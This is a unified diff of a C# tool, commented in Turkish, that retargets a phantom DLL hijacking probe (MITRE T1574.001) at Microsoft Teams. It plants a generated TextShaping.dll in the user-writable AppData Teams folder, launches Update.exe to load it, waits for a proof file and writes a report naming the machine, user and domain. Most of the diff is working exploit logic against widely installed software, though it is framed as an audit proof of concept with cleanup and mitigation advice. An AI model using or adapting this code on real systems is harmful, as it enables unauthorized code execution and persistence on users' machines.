@@ -1,12 +1,13 @@
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Threading;
 
-// PhantomDllHijackProbe v3 — T1574.001 Phantom DLL Hijacking
-// MITRE ATT&CK: T1574.001
+// TeamsUpdateDllHijackProbe v4 — T1574.001 Phantom DLL Hijacking
+// Hedef: Microsoft Teams — AppData\Local\Microsoft\Teams\Update.exe
+//        TextShaping.dll bu dizinde aranir ama mevcut degildir (phantom).
+//        Dizin kullanici tarafindan yazilabilirdir (non-admin yeterli).
 //
 // Bagimsiz — DLL payload PE'si runtime'da ic olarak uretilir.
 // Ek dosya gerekmez. Sadece bu exe calistirilir.
@@ -33,7 +34,6 @@ class PhantomDllHijackProbe
 {
     const string DLL_TARGET = "TextShaping.dll";
     const string PROOF_FILE = @"C:\Users\Public\phantom_dll_proof.txt"; // DLL PE'sine islenip degistirilemez
-    const string WIN_APPS   = @"C:\Program Files\WindowsApps";
 
     static string LOG_FILE     = null;  // Main'de EXE dizinine gore set edilir
     static string exeDir       = null;  // EXE'nin bulundugu klasor
@@ -234,43 +234,6 @@ class PhantomDllHijackProbe
         catch { return false; }
     }
 
-    static List<string[]> GetSearchPaths(string appDir)
-    {
-        var list = new List<string[]>();
-        if (!string.IsNullOrEmpty(appDir) && Directory.Exists(appDir))
-            list.Add(new string[] { appDir, "Uygulama dizini" });
-        list.Add(new string[] { Environment.GetFolderPath(Environment.SpecialFolder.System), "System32" });
-        string wow = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "SysWOW64");
-        if (Directory.Exists(wow)) list.Add(new string[] { wow, "SysWOW64" });
-        list.Add(new string[] { Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Windows" });
-        foreach (string seg in (Environment.GetEnvironmentVariable("PATH") ?? "").Split(';'))
-        {
-            string t = seg.Trim();
-            if (!string.IsNullOrEmpty(t) && Directory.Exists(t))
-                list.Add(new string[] { t, "PATH" });
-        }
-        return list;
-    }
-
-    static List<string[]> ScanWindowsApps()
-    {
-        var r = new List<string[]>();
-        try
-        {
-            foreach (string d in Directory.GetDirectories(WIN_APPS))
-            {
-                try
-                {
-                    foreach (string e in Directory.GetFiles(d, "*.exe", SearchOption.TopDirectoryOnly))
-                        r.Add(new string[] { Path.GetFileName(d), e });
-                }
-                catch { }
-            }
-        }
-        catch { }
-        return r;
-    }
-
     static void Cleanup()
     {
         foreach (string p in new string[] { deployedPath, tempDllPath })
@@ -287,109 +250,89 @@ class PhantomDllHijackProbe
 
     static void Main(string[] args)
     {
-        // EXE klasorunu belirle — tum cikti dosyalari buraya yazilacak
-        exeDir  = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\', '/');
+        exeDir   = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\', '/');
         LOG_FILE = Path.Combine(exeDir, "phantom_dll_log.txt");
 
-        Console.Title = "PhantomDllHijackProbe v3 - T1574.001 Audit";
+        Console.Title = "TeamsUpdateDllHijackProbe v4 - T1574.001 Audit";
         Console.WriteLine("============================================================");
-        Console.WriteLine("  T1574.001 - Phantom DLL Hijacking (Audit PoC v3)");
-        Console.WriteLine("  DLL    : " + DLL_TARGET);
-        Console.WriteLine("  Kanit  : " + PROOF_FILE);
-        Console.WriteLine("  Log    : " + LOG_FILE);
+        Console.WriteLine("  T1574.001 — Teams Update.exe Phantom DLL Hijacking");
+        Console.WriteLine("  Hedef    : AppData\\Local\\Microsoft\\Teams\\Update.exe");
+        Console.WriteLine("  Aranan   : " + DLL_TARGET + " (phantom — dizinde mevcut degil)");
+        Console.WriteLine("  Kanit    : " + PROOF_FILE);
+        Console.WriteLine("  Log      : " + LOG_FILE);
         Console.WriteLine("============================================================");
         Console.WriteLine();
 
-        // 1. Proof DLL'i runtime'da uret
+        // 1. Payload DLL'i hafizada uret
         Console.WriteLine("[*] Payload DLL uretiliyor...");
         byte[] dllBytes = BuildProofDll();
-        tempDllPath = Path.Combine(Path.GetTempPath(), "TextShapingProof_" + Guid.NewGuid().ToString("N") + ".dll");
+        tempDllPath = Path.Combine(Path.GetTempPath(),
+                          "TextShapingProof_" + Guid.NewGuid().ToString("N") + ".dll");
         File.WriteAllBytes(tempDllPath, dllBytes);
         Log("Payload DLL uretildi: " + tempDllPath + " (" + dllBytes.Length + " bytes)");
 
-        // 2. Phantom kontrol
-        Console.WriteLine("\n--- PHANTOM DLL KONTROL ---");
-        string[] chk = {
+        // 2. Teams dizinini belirle
+        string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        string teamsDir = Path.Combine(localApp, "Microsoft", "Teams");
+        string updateExe = Path.Combine(teamsDir, "Update.exe");
+        Log("Teams dizini: " + teamsDir);
+
+        // 3. Dizin var mi?
+        Console.WriteLine("\n--- TEAMS DIZIN KONTROL ---");
+        if (!Directory.Exists(teamsDir))
+        {
+            Log("HATA: Teams dizini bulunamadi: " + teamsDir);
+            Console.WriteLine("[!] Microsoft Teams bu makinede yuklu degil.");
+            Console.ReadKey(); Cleanup(); return;
+        }
+        Console.WriteLine("  [OK] Teams dizini mevcut  : " + teamsDir);
+        Console.WriteLine("  " + (File.Exists(updateExe) ? "[OK] Update.exe mevcut  : " : "[!] Update.exe YOK      : ") + updateExe);
+
+        // 4. Phantom kontrol — TextShaping.dll Teams dizininde olmamali
+        deployedPath = Path.Combine(teamsDir, DLL_TARGET);
+        if (File.Exists(deployedPath))
+        {
+            Log("HATA: " + deployedPath + " zaten mevcut — phantom senaryosu gecersiz.");
+            Console.WriteLine("[!] DLL zaten var, test gecersiz.");
+            Console.ReadKey(); Cleanup(); return;
+        }
+        Console.WriteLine("  [+] " + DLL_TARGET + " Teams dizininde YOK — Phantom senaryosu GECERLI.");
+
+        // 5. Yazilabilir mi?
+        if (!IsWritable(teamsDir))
+        {
+            Log("HATA: Teams dizini yazilabilir degil: " + teamsDir);
+            Console.WriteLine("[!] Dizin yazilabilir degil.");
+            Console.ReadKey(); Cleanup(); return;
+        }
+        Console.WriteLine("  [+] Dizin yazilabilir — non-admin yeterli.");
+
+        // 6. Sistem DLL kontrolu (bilgi amacli)
+        Console.WriteLine("\n--- SISTEM DIZIN KONTROL ---");
+        string[] sysChk = {
             Environment.GetFolderPath(Environment.SpecialFolder.System),
             Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "SysWOW64"),
             Environment.GetFolderPath(Environment.SpecialFolder.Windows)
         };
         bool isPhantom = true;
-        foreach (string d in chk)
+        foreach (string d in sysChk)
         {
             string full = Path.Combine(d, DLL_TARGET);
             bool ex = File.Exists(full);
             if (ex) isPhantom = false;
-            Log("  " + (ex ? "[MEVCUT] " : "[YOK]    ") + full);
+            Console.WriteLine("  " + (ex ? "[MEVCUT] " : "[YOK]    ") + full);
         }
         Console.WriteLine(isPhantom
-            ? "\n  [+] TextShaping.dll sistem dizinlerinde YOK — Phantom senaryo GECERLI.\n"
-            : "\n  [-] TextShaping.dll en az bir dizinde MEVCUT.\n");
-
-        // 3. Uygulama secimi
-        Console.WriteLine("--- WINDOWSAPPS UYGULAMA SECIMI ---");
-        var apps = ScanWindowsApps();
-        string selectedDir = null;
-        if (apps.Count > 0)
-        {
-            int show = Math.Min(apps.Count, 20);
-            for (int i = 0; i < show; i++)
-                Console.WriteLine("  [" + (i+1) + "] " + apps[i][0]);
-            if (apps.Count > 20) Console.WriteLine("  ... (+" + (apps.Count-20) + " daha)");
-            Console.Write("\nUygulama sec (0=atla): ");
-            int ch;
-            if (int.TryParse(Console.ReadLine(), out ch) && ch >= 1 && ch <= apps.Count)
-            {
-                selectedDir = Path.GetDirectoryName(apps[ch-1][1]);
-                Log("Secilen: " + apps[ch-1][0]);
-            }
-        }
-        else Console.WriteLine("  WindowsApps listelenemedi.");
-
-        // 4. Yazilabilir arama yolu tara
-        Console.WriteLine("\n--- DLL ARAMA YOLU TARAMASI ---");
-        var paths      = GetSearchPaths(selectedDir);
-        var candidates = new List<string[]>();
-        foreach (string[] entry in paths)
-        {
-            bool exists   = Directory.Exists(entry[0]);
-            bool writable = exists && IsWritable(entry[0]);
-            bool dllEx    = exists && File.Exists(Path.Combine(entry[0], DLL_TARGET));
-            string status = !exists ? "YOK         " : writable ? "YAZILABILIR " : "SALT-OKUNUR ";
-            string mark   = dllEx ? " [DLL mevcut]" : " [DLL yok — aday]";
-            Console.WriteLine("  [" + status + "] [" + entry[1].PadRight(16) + "] " + entry[0] + mark);
-            if (writable && !dllEx) candidates.Add(entry);
-        }
-        if (candidates.Count == 0)
-        {
-            Log("Uygun yazilabilir yol bulunamadi."); Console.ReadKey(); Cleanup(); return;
-        }
-        Console.WriteLine("\n  [+] " + candidates.Count + " aday yol.");
-
-        // 5. Hedef yol sec
-        Console.WriteLine("\n--- YOL SECIMI ---");
-        for (int i = 0; i < candidates.Count; i++)
-            Console.WriteLine("  [" + (i+1) + "] [" + candidates[i][1] + "] " + candidates[i][0]);
-        Console.Write("\nSec (1-" + candidates.Count + ") | 0=cikis: ");
-        int sel;
-        if (!int.TryParse(Console.ReadLine(), out sel) || sel < 1 || sel > candidates.Count)
-        { Log("Cikis."); Cleanup(); return; }
-
-        string targetDir  = candidates[sel-1][0];
-        deployedPath      = Path.Combine(targetDir, DLL_TARGET);
-        Log("Hedef: " + deployedPath);
-
-        // 6. Tetikleyici
-        Console.Write("\nTetikleyici exe yolu (bos=manuel): ");
-        string trigger = (Console.ReadLine() ?? "").Trim();
+            ? "  [+] Sistem dizinlerinde de YOK — tam phantom."
+            : "  [-] Sistem dizininde mevcut ama Teams dizini oncelikli aranir.");
 
         // 7. Ozet + onay
-        Console.WriteLine("\n--- OZET ---");
+        Console.WriteLine("\n--- ISLEM OZETI ---");
         Console.WriteLine("  Deploy  : " + deployedPath);
         Console.WriteLine("  Kanit   : " + PROOF_FILE);
-        Console.WriteLine("  Tetikle : " + (trigger == "" ? "(manuel)" : trigger));
+        Console.WriteLine("  Tetikle : Update.exe (otomatik) veya Teams'i elle ac");
         Console.WriteLine("  Temizlik: Otomatik");
-        Console.Write("Devam? (E/H): ");
+        Console.Write("\nDevam? (E/H): ");
         string c = Console.ReadLine();
         if (c == null || c.Trim().ToUpper() != "E") { Log("Iptal."); Cleanup(); return; }
 
@@ -401,28 +344,34 @@ class PhantomDllHijackProbe
         }
         catch (Exception ex) { Log("Deploy hatasi: " + ex.Message); Cleanup(); Console.ReadKey(); return; }
 
-        // 9. Tetikle
-        if (trigger != "" && File.Exists(trigger))
+        // 9. Tetikle: Update.exe --processStart Teams.exe
+        if (File.Exists(updateExe))
         {
-            Log("Tetikleniyor: " + trigger);
+            Log("Tetikleniyor: " + updateExe);
             try
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
-                psi.FileName = trigger; psi.UseShellExecute = true;
-                using (Process p = Process.Start(psi)) Log("PID: " + (p != null ? p.Id.ToString() : "?"));
+                psi.FileName  = updateExe;
+                psi.Arguments = "--processStart Teams.exe";
+                psi.UseShellExecute = true;
+                using (Process p = Process.Start(psi))
+                    Log("PID: " + (p != null ? p.Id.ToString() : "?"));
             }
             catch (Exception ex) { Log("Tetikleme hatasi: " + ex.Message); }
         }
-        else Console.WriteLine("\n[*] Hedef uygulamayi elle calistirin...");
+        else
+        {
+            Console.WriteLine("\n[*] Update.exe bulunamadi — Teams'i elle ac veya oturumu yeniden basla.");
+        }
 
-        // 10. Kanit bekle (90 sn)
+        // 10. Kanit bekle (120 sn — Teams acilisi biraz uzun surebilir)
         Console.WriteLine();
-        Log("Kanit bekleniyor: " + PROOF_FILE + " (max 90s)");
+        Log("Kanit bekleniyor: " + PROOF_FILE + " (max 120s)");
         bool found = false;
-        for (int i = 1; i <= 90; i++)
+        for (int i = 1; i <= 120; i++)
         {
             if (File.Exists(PROOF_FILE)) { found = true; break; }
-            Console.Write("\r  Bekleniyor... " + i + "/90s");
+            Console.Write("\r  Bekleniyor... " + i + "/120s");
             Thread.Sleep(1000);
         }
         Console.WriteLine();
@@ -430,16 +379,13 @@ class PhantomDllHijackProbe
         // 11. Sonuc
         if (found)
         {
-            string dllProof = File.ReadAllText(PROOF_FILE);
-
-            // Sistem bilgileri
-            string compName   = Environment.MachineName;
-            string userName   = Environment.UserName;
-            string domain     = Environment.UserDomainName;
-            string osVer      = Environment.OSVersion.ToString();
-            string probeExe   = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            string probeVer   = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.ToString();
-            string auditTime  = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+            string dllProof  = File.ReadAllText(PROOF_FILE);
+            string compName  = Environment.MachineName;
+            string userName  = Environment.UserName;
+            string domain    = Environment.UserDomainName;
+            string osVer     = Environment.OSVersion.ToString();
+            string probeExe  = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string auditTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
 
             bool isAdmin = false;
             try
@@ -452,36 +398,39 @@ class PhantomDllHijackProbe
 
             string auditReport =
                 "============================================================\r\n" +
-                "  AUDIT RAPORU — PHANTOM DLL HIJACKING (T1574.001)\r\n" +
+                "  AUDIT RAPORU — TEAMS UPDATE.EXE PHANTOM DLL HIJACKING\r\n" +
+                "  MITRE ATT&CK : T1574.001\r\n" +
                 "============================================================\r\n" +
                 "Tarih/Saat     : " + auditTime + "\r\n" +
                 "Bilgisayar     : " + compName + "\r\n" +
                 "Kullanici      : " + domain + "\\" + userName + "\r\n" +
-                "Admin          : " + (isAdmin ? "EVET" : "HAYIR (non-admin olarak test edildi)") + "\r\n" +
+                "Admin          : " + (isAdmin ? "EVET" : "HAYIR (non-admin ile gerceklestirildi)") + "\r\n" +
                 "Isletim Sistemi: " + osVer + "\r\n" +
                 "Test Araci     : " + probeExe + "\r\n" +
                 "------------------------------------------------------------\r\n" +
-                "Zafiyet        : Phantom DLL Hijacking\r\n" +
-                "MITRE ATT&CK   : T1574.001\r\n" +
+                "Zafiyet        : Microsoft Teams Update.exe Phantom DLL Hijacking\r\n" +
+                "MITRE ATT&CK   : T1574.001 (DLL Search Order Hijacking)\r\n" +
+                "Hedef Uygulama : Microsoft Teams — Update.exe\r\n" +
                 "Hedef DLL      : " + DLL_TARGET + "\r\n" +
                 "Deploy Yolu    : " + deployedPath + "\r\n" +
-                "Phantom mi     : " + (isPhantom ? "EVET — sistem dizinlerinde DLL yok" : "HAYIR — PATH senaryosu") + "\r\n" +
+                "Phantom mi     : " + (isPhantom ? "EVET — hicbir sistem dizininde mevcut degil" : "EVET — Teams dizini oncelikli aranir") + "\r\n" +
                 "------------------------------------------------------------\r\n" +
-                "DLL YUKLENME KANITI (phantom_dll_proof.txt icerigi):\r\n" +
+                "DLL YUKLENME KANITI:\r\n" +
                 dllProof.Trim() + "\r\n" +
                 "------------------------------------------------------------\r\n" +
-                "Sonuc          : Non-admin kullanici, DLL arama sirasindaki\r\n" +
-                "                 yazilabilir dizine " + DLL_TARGET + " yukleyerek\r\n" +
-                "                 hedef uygulamada keyfi kod calistirdi.\r\n" +
-                "                 Etki: Privilege escalation / lateral movement.\r\n" +
+                "Sonuc          : Non-admin kullanici, kullaniciya ait ve yazilabilir\r\n" +
+                "                 AppData\\Local\\Microsoft\\Teams\\ dizinine\r\n" +
+                "                 " + DLL_TARGET + " birakarak Teams Update.exe\r\n" +
+                "                 araciligiyla keyfi kod calistirmayi baardi.\r\n" +
+                "                 Etki: Persistence (Teams startup), kod yurutme.\r\n" +
                 "------------------------------------------------------------\r\n" +
-                "Oneri          : Yazilabilir PATH dizinlerini kisitla.\r\n" +
-                "                 TextShaping.dll ghost DLL fix uygula.\r\n" +
-                "                 CWDIllegalInDllSearch registry politikasini etkinlestir.\r\n" +
+                "Oneri          : AppLocker / WDAC ile kullanici dizinlerinden\r\n" +
+                "                 DLL yuklenmesini kisitla.\r\n" +
+                "                 Microsoft Teams icin ghost DLL fix uygula.\r\n" +
+                "                 Process Mitigation: DLL load policy.\r\n" +
                 "============================================================\r\n";
 
-            // Tum cikti dosyalarini EXE klasorune yaz
-            string reportPath = Path.Combine(exeDir, "phantom_dll_audit_report.txt");
+            string reportPath = Path.Combine(exeDir, "teams_dll_audit_report.txt");
             string localProof = Path.Combine(exeDir, "phantom_dll_proof.txt");
             try { File.WriteAllText(reportPath, auditReport); } catch { }
             try { File.Copy(PROOF_FILE, localProof, true); } catch { }
@@ -495,11 +444,11 @@ class PhantomDllHijackProbe
         }
         else
         {
-            Log("Kanit dosyasi olusturulmadi.");
-            Console.WriteLine("\n[?] Kontrol edin:");
-            Console.WriteLine("    1. Uygulama TextShaping.dll ariyor mu? (ProcMon)");
-            Console.WriteLine("    2. Secilen yol arama sirasinda dogru mu?");
-            Console.WriteLine("    3. x86/x64 uyumu?");
+            Log("Kanit dosyasi olusturulmadi (120s icinde DLL yuklenmedi).");
+            Console.WriteLine("\n[?] DLL yuklenmediyse:");
+            Console.WriteLine("    1. Teams gercekten Update.exe uzerinden mi acildi?");
+            Console.WriteLine("    2. Teams zaten acik miydi? (Kapat, DLL'i koy, yeniden ac)");
+            Console.WriteLine("    3. x86/x64 uyumu? (Update.exe 32-bit mi?)");
         }
 
         // 12. Temizlik ve cikis
